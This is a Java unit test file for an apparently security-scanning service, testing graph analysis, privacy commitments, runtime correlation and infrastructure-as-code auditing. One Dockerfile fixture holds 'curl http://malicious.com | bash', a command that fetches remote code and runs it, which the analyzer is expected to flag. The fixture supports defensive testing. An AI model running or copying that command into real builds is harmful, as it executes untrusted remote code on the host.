package com.autoforge;

import com.autoforge.analyzer.dynamic.CorrelationEngine;
import com.autoforge.analyzer.graph.CrossRepoGraphBuilder;
import com.autoforge.analyzer.iac.IaCAnalyzer;
import com.autoforge.analyzer.privacy.ZKProofGenerator;
import com.autoforge.controller.AnalysisController;
import com.autoforge.entity.Finding;
import com.autoforge.repository.FindingRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
public class AnalysisAndIaCUnitTest {

    @Mock
    private FindingRepository findingRepository;

    private AnalysisController analysisController;

    @BeforeEach
    void setUp() {
        CrossRepoGraphBuilder graphBuilder = new CrossRepoGraphBuilder();
        ZKProofGenerator zkProofGenerator = new ZKProofGenerator();
        CorrelationEngine correlationEngine = new CorrelationEngine();
        IaCAnalyzer iacAnalyzer = new IaCAnalyzer();

        analysisController = new AnalysisController(
                graphBuilder,
                zkProofGenerator,
                correlationEngine,
                iacAnalyzer,
                findingRepository
        );
    }

    @Test
    void testRebuildGraphAndBlastRadius() {
        ResponseEntity<Map<String, Object>> rebuildResp = analysisController.rebuildGraph(null);
        assertEquals(HttpStatus.OK, rebuildResp.getStatusCode());
        assertEquals("REBUILT", rebuildResp.getBody().get("status"));

        ResponseEntity<Map<String, Object>> blastResp = analysisController.getBlastRadius("auth-service");
        assertEquals(HttpStatus.OK, blastResp.getStatusCode());
        assertEquals("auth-service", blastResp.getBody().get("source_service"));
    }

    @Test
    void testPrivacyCommitmentAndVerification() {
        Map<String, String> commitReq = Map.of(
                "scan_results", "{\"scanId\": 10, \"critical\": 0}",
                "secret_salt", "tenant-salt-abc"
        );
        ResponseEntity<Map<String, Object>> commitResp = analysisController.createPrivacyCommitment(commitReq);
        assertEquals(HttpStatus.OK, commitResp.getStatusCode());
        String commitment = String.valueOf(commitResp.getBody().get("commitment"));
        assertNotNull(commitment);

        Map<String, String> verifyReq = Map.of(
                "scan_results", "{\"scanId\": 10, \"critical\": 0}",
                "secret_salt", "tenant-salt-abc",
                "commitment", commitment
        );
        ResponseEntity<Map<String, Object>> verifyResp = analysisController.verifyPrivacyCommitment(verifyReq);
        assertEquals(HttpStatus.OK, verifyResp.getStatusCode());
        assertEquals(true, verifyResp.getBody().get("valid"));
    }

    @Test
    void testRuntimeEventsCorrelation() {
        Map<String, Object> eventReq = Map.of(
                "scan_id", 100L,
                "events", List.of(Map.of("line", 55, "executed", true, "service", "payment"))
        );
        ResponseEntity<Map<String, Object>> ingestResp = analysisController.ingestRuntimeEvents(eventReq);
        assertEquals("RECORDED", ingestResp.getBody().get("status"));

        Finding finding = new Finding();
        finding.setId(1L);
        finding.setLineNumber(55);
        finding.setRuleId("SEC-001");
        when(findingRepository.findByScanId(100L)).thenReturn(List.of(finding));

        ResponseEntity<Map<String, Object>> corrResp = analysisController.getRuntimeCorrelation(100L);
        assertEquals(1, corrResp.getBody().get("runtime_confirmed_count"));
    }

    @Test
    void testIaCAnalyzerAuditK8sAndDockerfile() {
        Map<String, String> k8sReq = Map.of(
                "manifest_type", "k8s",
                "content", "spec:\n  containers:\n    - name: test\n      securityContext:\n        privileged: true"
        );
        ResponseEntity<Map<String, Object>> k8sResp = analysisController.analyzeIaC(k8sReq);
        assertEquals(HttpStatus.OK, k8sResp.getStatusCode());
        assertEquals(1, k8sResp.getBody().get("findings_count"));

        Map<String, String> dockerReq = Map.of(
                "manifest_type", "dockerfile",
                "content", "FROM ubuntu:20.04\nRUN curl http://malicious.com | bash\nUSER root"
        );
        ResponseEntity<Map<String, Object>> dockerResp = analysisController.analyzeIaC(dockerReq);
        assertEquals(HttpStatus.OK, dockerResp.getStatusCode());
        assertEquals(2, dockerResp.getBody().get("findings_count"));
    }
}
